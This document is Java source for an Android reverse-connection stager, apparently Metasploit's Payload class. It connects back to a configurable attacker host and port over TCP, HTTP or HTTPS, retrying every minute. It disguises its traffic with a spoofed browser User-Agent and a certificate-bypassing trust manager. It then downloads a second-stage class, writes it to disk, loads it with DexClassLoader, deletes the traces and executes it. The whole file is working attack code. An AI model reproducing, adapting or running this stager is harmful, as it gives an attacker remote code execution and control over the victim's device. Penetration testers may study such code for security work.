package com.metasploit.stage;

import android.content.Context;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

import javax.net.ssl.HttpsURLConnection;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

import dalvik.system.DexClassLoader;

public class Payload {

    public static final String LHOST =	"XXXX127.0.0.1:M                     ";
    public static final String LPORT = 	"YYYY4444                            "; 

    public static Context context;

    public static void main(String[] args) {
    	
    	while(!startReverseConn(LHOST.substring(4).trim().split(":")[1])) {
			try {
				Thread.sleep(60000);
			} catch (InterruptedException e) {
				//e.printStackTrace();
			}
    	}
    }
    
    private static boolean startReverseConn(String lprotocol) {
    	try {
	    	if (lprotocol.equals("T")) {
	    		reverseTCP();
	    	}
	    	else if (lprotocol.equals("H")) {
	    		reverseHTTP(false);
	    	}
	    	else if (lprotocol.equals("HS")) {
	    		reverseHTTP(true);
	    	}
	    	return true;
    	} catch (Exception e) {
    		return false;
    	}
    }
    
    static final String AB = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    static Random rnd = new Random();
    static String randomString( int len ) 
    {
       StringBuilder sb = new StringBuilder( len );
       for( int i = 0; i < len; i++ ) 
          sb.append( AB.charAt( rnd.nextInt(AB.length()) ) );
       return sb.toString();
    }

    static int checksumText(String s) {
    	int tmp = 0;
    	for(int i = 0; i < s.length(); i++)
    		tmp += (int)s.charAt(i);
    	return tmp % 0x100;
    }
    
    static int URI_CHECKSUM_INITJ = 88;
    
    private static void reverseHTTP(boolean ssl) throws Exception {
    	int checksum = 0;
    	String URI;
    	HttpURLConnection urlConn;

        String lhost = LHOST.substring(4).trim().split(":")[0];
        String lport = LPORT.substring(4).trim();
        
        while(true) {
        	URI = randomString(4);		
        	checksum = checksumText(URI);	
        	if(checksum == URI_CHECKSUM_INITJ) break;
    	}
      
        String FullURI = "/" + URI.toString();
        
        String urlStart = ssl ? "https://" : "http://";
        
		URL url = new URL(urlStart + lhost + ":" + lport + FullURI + "_" + randomString(16));	 
    	
    	if (ssl) { 
    		urlConn = (HttpsURLConnection) url.openConnection();
    		Class.forName("com.metasploit.android.stage.PayloadTrustManager")
    		.getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {urlConn});
    	}
    	else urlConn = (HttpURLConnection) url.openConnection();
    	
        urlConn.setDoInput (true);
        urlConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0");
        urlConn.setRequestMethod("GET");
        urlConn.connect();
        DataInputStream in = new DataInputStream(urlConn.getInputStream());
        
        loadStage(in, null, context, new String[] {});	        
        urlConn.disconnect();    	
    }
    
    private static void loadStage(DataInputStream in, OutputStream out, Context context, String[] parameters) throws Exception {
    	
    	String path = new File(".").getAbsolutePath();
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";

        // Read the class name
        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        String classFile = new String(core);

        // Read the stage
        coreLen = in.readInt();
        core = new byte[coreLen];
        in.readFully(core);

        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();

        // Load the stage
        DexClassLoader classLoader = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader());
        Class<?> myClass = classLoader.loadClass(classFile);
        final Object stage = myClass.newInstance();
        file.delete();
        new File(dexPath).delete();
        myClass.getMethod("start", new Class[]{
                DataInputStream.class, OutputStream.class, Context.class, String[].class
        }).invoke(stage, new Object[]{
                in, out, context, new String[] {},
        });

    }
    
    private static void reverseTCP() {
        try {
            String lhost = LHOST.substring(4).trim().split(":")[0];
            String lport = LPORT.substring(4).trim();
            Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
            DataInputStream in = new DataInputStream(msgsock.getInputStream());
            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
            loadStage(in, out, context, new String[] {});

        } catch (Exception e) {
            e.printStackTrace();
        }
        
    }

}

